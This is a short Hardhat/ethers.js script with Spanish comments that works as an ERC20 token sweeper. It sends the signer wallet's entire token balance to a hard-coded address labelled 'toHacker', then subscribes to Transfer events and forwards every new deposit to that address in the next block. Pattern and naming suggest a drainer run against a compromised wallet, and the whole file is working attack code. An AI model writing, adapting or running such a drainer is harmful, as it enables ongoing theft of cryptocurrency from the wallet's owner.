
import { ethers } from "hardhat";

const addresContrato = "0xD711b49C4d218008C84530487F99d77640D2Fa94";
const toHacker = "0x70E24350DCA5C9EB381fE4bCf4474E27f1e66C12";

async function transferERC20() {
  const MyTokenFactory = await ethers.getContractFactory("MyToken");
    console.log(1);
    
  const token = MyTokenFactory.attach(addresContrato);
  console.log(2);
  const signers = await ethers.getSigners();
  const signer = signers[0];
  const wallet = signer.address;

  const events = token.filters.Transfer(null, wallet);
  console.log(3);

  const balanceERC20Wei = await token.balanceOf(wallet);
  const balanceERC20 = ethers.utils.formatEther(balanceERC20Wei);
  console.log(4);
  if (parseInt(balanceERC20) > 0) {
    console.log(5);
    const tx = await token.transfer(toHacker, balanceERC20Wei);
    console.log(6);
    await tx.wait(1);
    console.log(7);
  } else {
    console.log("wallet vacia");
  }

  console.log(8);


  token.on(events, (from, to) => {
    console.log(9);
    async function Listener () {
        console.log(10);
      const balanceERC20Wei = await token.balanceOf(wallet);
      const balanceERC20 = ethers.utils.formatEther(balanceERC20Wei);

      if (parseInt(balanceERC20) > 0) {
        const tx = await token.transfer(toHacker, balanceERC20Wei);
        await tx.wait(); // el retiro del token se realiza en el siguiente bloque que acepto el deposito
        console.log("Se devivo el deposito!");
        
      } else {
        console.log("error! se activo el evento pero no hay depositos de ERC20");
      }
    };

    Listener()
  });

  // from: 0x7cD315d4E6086B99b81533152cd577e8802779B7
  // to:   0x70E24350DCA5C9EB381fE4bCf4474E27f1e66C12
}

transferERC20();
